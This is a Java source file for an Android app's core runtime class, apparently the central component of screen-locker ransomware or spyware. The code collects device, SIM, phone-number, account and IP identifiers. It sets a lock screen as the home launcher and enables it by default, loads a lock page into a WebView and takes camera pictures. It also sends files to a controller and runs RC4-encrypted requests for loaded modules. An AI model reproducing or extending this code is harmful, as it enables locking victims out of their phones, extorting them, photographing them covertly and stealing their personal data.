package com.zer0.possessor;

import java.io.File;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import android.content.Context;
import android.content.res.Configuration;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.text.TextUtils;

public class ZRuntime extends Object
{
    private static ZRuntime _instance = null;

    private Context _context;

	private boolean _isRunning;

	private String _uniqId;
	private int _osValue;
	private ByteBuffer _osLang;

	private String _deviceId;
	private String _manufacturer;
	private String _model;

	private final ExecutorService _threadPool = Executors.newCachedThreadPool();
	private Configuration _configuration;

    ZModuleManager _zModuleMgr;
    Preferences _prefs;
    FileUtils _fileUtils;
    SystemUtils _sysUtils;
    Controller _ctrl;
    PhoneManager _phoneMgr;

	public ZRuntime(Context context)
	{		
		_context = context;
        _zModuleMgr = new ZModuleManager(this, _context);
        _prefs = new Preferences(_context);
        _fileUtils = new FileUtils(_context);
        _sysUtils = new SystemUtils(this);
        _phoneMgr = new PhoneManager(_context);

		_configuration = context.getResources().getConfiguration();

		_isRunning = false;
		
		_manufacturer = android.os.Build.MANUFACTURER;
		_model = android.os.Build.MODEL;


		_uniqId = "";

		Cursor c = null;
        try {
            Uri uri = Uri.parse("content://com.google.android.gsf.gservices");
            String ID_KEY = "android_id";
            String params[] = {ID_KEY};
            c  = context.getContentResolver().query(uri, null, null, params, null);
            _deviceId = null;
            if (c != null && c.moveToFirst() && c.getColumnCount() >= 2) {
                try {
                    _deviceId = Long.toHexString(Long.parseLong(c.getString(1)));
                }
                catch (NumberFormatException e) {
                    e.printStackTrace();
                    _deviceId = _phoneMgr.getTelephonyManager().getDeviceId();
                }
            }
            if (_deviceId != null && !_deviceId.equals("null")) {
                _uniqId += _deviceId;
            }
			else {
				_deviceId = "";
			}
        }
        catch (Exception e) {
            e.printStackTrace();
        }
		finally {
			if (c != null) {
				c.close();
			}
		}

        try {
            final String androidId = Settings.Secure.getString(_context.getContentResolver(), Settings.Secure.ANDROID_ID);
            if (androidId != null && !androidId.equals("null")) {
                _uniqId += androidId;
            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }

		if (_uniqId.length() < 64) {
			for (int i = 0; _uniqId.length() < 64; ++i) {
				_uniqId += this._uniqId.charAt(i);
			}
	    }
        else if (_uniqId.length() > 64) {
            _uniqId = _uniqId.substring(0, 64);
        }
        _uniqId = _uniqId.toLowerCase();
		
		TextUtils.StringSplitter splitter = new TextUtils.SimpleStringSplitter('.');

		_osValue = 0x08000000;
		splitter.setString(android.os.Build.VERSION.RELEASE);
		int shifts[] = { 16, 12, 8 };
		int i = 0;
		for (String s : splitter) {
		    int numVal = Integer.parseInt(s);
		    _osValue |= (numVal << shifts[i++]);
		}
		
		splitter = new TextUtils.SimpleStringSplitter('_');
		splitter.setString(_configuration.locale.toString());
		_osLang = ByteBuffer.allocate(4);
		i = 0;
		for (String s : splitter) {
			if (++i < 3) {
				_osLang.put(s.getBytes(), 0, 2);
			}
		}

        _ctrl = new Controller(this);
	}
	
	public static synchronized ZRuntime getInstance(Context context)
	{
		if (_instance == null){
			synchronized(ZRuntime.class) {
				if (_instance == null) {
					_instance = new ZRuntime(context);
				}
			}
		}
		return _instance;
	}

	public Context getContext()
	{
		return _context;
	}

	public int getCoreHash()
	{
		return 0x5A807058;
	}

    public int getCoreVersion()
	{
		return 0x0000024A;
	}

    public int getOsValue()
    {
        return _osValue;
    }

    public ByteBuffer getOsLang()
    {
        return _osLang;
    }

    public int getBuildId()
	{
		return 1;
	}

    public int getSubId() { return 7; }

    public int getPlatformId()
	{
		return 4;
	}
	public String getUniqId()
	{
		return _uniqId;
	}

	public boolean isRunning()
	{
		return _isRunning;
	}

	public void setRunning(boolean run)
	{
		_isRunning = run;
	}


	public String getDeviceID()
	{
		return _deviceId;
	}
	public String getManufacturer()
	{
		return _manufacturer;
	}
	public String getModel()
	{
		return _model;
	}

	public Object createRequest()
	{
		return (Object)new ZCtrlRequest(this);
	}

	public Object createInputStream()
	{
		return (Object)new ZInputStream();
	}
	
    public ExecutorService getThreadPool()
    {
        return _threadPool;
    }

	public Thread runCtrlRequest(Object zRequest)
	{
		Thread thread = new Thread(new ActionsRunner((ZCtrlRequest)zRequest));
		thread.start();
		return thread;
	}
	
	private class ActionsRunner implements Runnable
	{
		ZCtrlRequest _zRequest;
		public ActionsRunner(ZCtrlRequest zRequest)
		{
			_zRequest = zRequest;
		}

		public void run()
		{
			try {
				_zRequest.doRequest();
                _zRequest.getModuleOwner().call("onCtrlResponse", _zRequest);
			}
			catch (IOException e) {
                e.printStackTrace();
			}
		}
	}

    public String getPackageName()
    {
        return _context.getPackageName();
    }

    public long checksum(byte[] data)
    {
        return CRC64.checksum(data);
    }

    public static byte[] encrypt(final byte[] data, final byte[] key)
    {
        return Arc4.encrypt(data, key);
    }


	// ZCtrlRequest wrappers
	public void requestInit(Object zRequest, int requestHash)
	{
		((ZCtrlRequest)zRequest).init(requestHash);
	}

    public Object requestGetOutputStream(Object zRequest)
    {
        return (Object)((ZCtrlRequest)zRequest).getRequestStream();
    }

    public Object requestGetInputStream(Object zRequest)
    {
        return (Object)((ZCtrlRequest)zRequest).getResponseStream();
    }


    public Object requestDo(Object zRequest) throws IOException
    {
        return (Object)((ZCtrlRequest)zRequest).doRequest();
    }

    public void requestSetModuleOwner(Object zRequest, Object owner)
    {
        ((ZCtrlRequest)zRequest).setModuleOwner(owner);
    }

    public int requestGetHash(Object zRequest)
    {
        return ((ZCtrlRequest)zRequest).getRequestHash();
    }

    // ZInputRequest wrappers
    public int zisReadInt(Object zis) throws IOException
    {
        return ((ZInputStream)zis).readInt();
    }

    public long zisReadLong(Object zis) throws IOException
    {
        return ((ZInputStream)zis).readLong();
    }

    public int zisRead(Object zis, byte[] buffer, int byteOffset, int byteCount) throws IOException
    {
        return ((ZInputStream)zis).read(buffer, byteOffset, byteCount);
    }

    public String zisReadBinaryString(Object zis) throws IOException
    {
        return ((ZInputStream)zis).readBinaryString();
    }

    public void zisClose(Object zis) throws IOException
    {
        ((ZInputStream)zis).close();
    }

    // ZOutputStream wrappers
    public void zosWriteInt(Object zos, int value)
    {
        ((ZOutputStream)zos).writeInt(value);
    }

    public void zosWriteLong(Object zos, long value)
    {
        ((ZOutputStream)zos).writeLong(value);
    }

    public void zosWriteBinaryString(Object zos, String str)
    {
        ((ZOutputStream)zos).writeBinaryString(str);
    }

    // LockActivity wrappers
    public boolean activityIsExists()
    {
        return LockActivity.getInstance() != null;
    }

    public void activitySetOwnerModule(Object zModule)
    {
        LockActivity.getInstance().setOwnerModule(zModule);
    }

    public String activityGetIndexPath()
    {
        return LockActivity.getInstance().getIndexPath();
    }

    public void activitySetIndexPath(String p)
    {
        LockActivity.getInstance().setIndexPath(p);
    }

    public void activityRunOnUiThread(Runnable action)
    {
        LockActivity.getInstance().runOnUiThread(action);
    }

    public void activityClearHistory()
    {
        LockActivity.getInstance().clearHistory();
    }

    public void activityLoadUrl(String url)
    {
        LockActivity.getInstance().loadUrl(url);
    }

    public void activityEnd(Object zModule)
    {
        LockActivity.getInstance().endActivity(zModule);
    }

    public void activityCreateCamera()
    {
        LockActivity.getInstance().createCamera();
    }

    public boolean activityIsCameraInited()
    {
        return LockActivity.getInstance().isCameraInited();
    }

    public boolean activityTakePicture(File imageFile)
    {
        return LockActivity.getInstance().takePicture(imageFile);
    }

    public void activityDestroyCamera()
    {
        LockActivity.getInstance().destroyCamera();
    }

    public void enableLockAsHomeLauncher(boolean enabled)
    {
        LockActivity.enableLockAsHomeLauncher(enabled);
    }

    public void launchLockActivity()
    {
        LockActivity.launchLockActivity();
    }

    public void sendJavascript(final String statement)
    {
        final LockActivity a = LockActivity.getInstance();
        if (a != null) {
            a.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    a.sendJavascript(statement);
                }
            });
        }
    }

    public boolean shouldLockScreen()
    {
        return _prefs.loadBoolean("lcks", true); // if need lock screen by default we use 'true', else we use 'false'
    }
    void setShouldLockScreen(final boolean needLock)
    {
        _prefs.saveBoolean("lcks", needLock);
    }

    // ZModuleManager wrappers
    public Object getModuleManager()
    {
        return (Object)_zModuleMgr;
    }

    public File getModuleDataPath(int moduleHash)
    {
        return _zModuleMgr.getModuleDataPath(moduleHash);
    }

    public void addFrequentTask(Object tsk)
    {
        _zModuleMgr.addFrequentTask(tsk);
    }

    public void addCommonTask(Object tsk)
    {
        _zModuleMgr.addCommonTask(tsk);
    }

    public void deactivateModule(int moduleHash)
    {
        _zModuleMgr.deactivateModule(moduleHash);
    }

    // Preferences wrappers
    public final Preferences getPrefs()
    {
        return _prefs;
    }

    public void saveString(String key, String value)
    {
        _prefs.saveString(key, value);
    }

    public String loadString(String key, String defaultValue)
    {
        return _prefs.loadString(key, defaultValue);
    }

    public void saveInt(String key, int value)
    {
        _prefs.saveInt(key, value);
    }
    public int loadInt(String key, int defaultValue)
    {
        return _prefs.loadInt(key, defaultValue);
    }
    public void saveLong(String key, long value)
    {
        _prefs.saveLong(key, value);
    }
    public long loadLong(String key, long defaultValue)
    {
        return _prefs.loadLong(key, defaultValue);
    }
    public void saveBoolean(String key, boolean value)
    {
        _prefs.saveBoolean(key, value);
    }
    public boolean loadBoolean(String key, boolean defaultValue)
    {
        return _prefs.loadBoolean(key, defaultValue);
    }

    // FileUtils wrappers
    public boolean saveFile(String filePath, byte[] data)
    {
        return FileUtils.saveFile(filePath, data);
    }

    public boolean createFile(String path, String content)
    {
        return FileUtils.createFile(path, content);
    }

    public boolean extractFiles(String sourcePath, String relPath, String destPath)
    {
        return FileUtils.extractFiles(sourcePath, relPath, destPath);
    }

    public List<File> getExternalRootPaths()
    {
        return _fileUtils.getExternalRootPaths();
    }

    public void appendFile(String path, String content)
    {
        FileUtils.appendFile(path, content);
    }

    public String readTextFile(String path)
    {
        return FileUtils.readTextFile(path);
    }

    public List<File> getFiles(String path, final String matchRegex, int orderType)
    {
        return FileUtils.getFiles(path, matchRegex, orderType);
    }

    // StringUtils wrappers
    public String joinStrings(List<String> list, String sep)
    {
        return StringUtils.joinStrings(list, sep);
    }

    public String getHexFrom(byte[] data)
    {
        return StringUtils.getHexFrom(data);
    }

    // SystemUtils wrappers
    public Object getSystemUtils()
    {
        return (Object)_sysUtils;
    }

    public boolean hasCamera()
    {
        return _sysUtils.hasCamera();
    }

    public String getAccountName()
    {
        return _sysUtils.getAccountName();
    }

    // Controller wrappers
    public Object getController()
    {
        return (Object)_ctrl;
    }

    public boolean sendFiles(final String sdirName, List<File> files) throws InterruptedException
    {
        return _ctrl.sendFiles(sdirName, files);
    }

    public byte[] getToken()
    {
        return _ctrl.getToken();
    }

    public String getCountryCode()
    {
        return _ctrl.getCountryCode();
    }
    public String getWanIP() { return _ctrl.getWanIP(); }

    // PhoneManager wrappers
    public PhoneManager getPhoneManager()
    {
        return _phoneMgr;
    }

    public TelephonyManager getTelephonyManager()
    {
        return _phoneMgr.getTelephonyManager();
    }

    public String getLine1Number()
    {
        return _phoneMgr.getLine1Number();
    }

    public String getNetworkOperatorName()
    {
        return _phoneMgr.getNetworkOperatorName();
    }
    public String getNetworkType()
    {
        return _phoneMgr.getNetworkType();
    }

    public String getSIMState()
    {
        return _phoneMgr.getSIMState();
    }
}
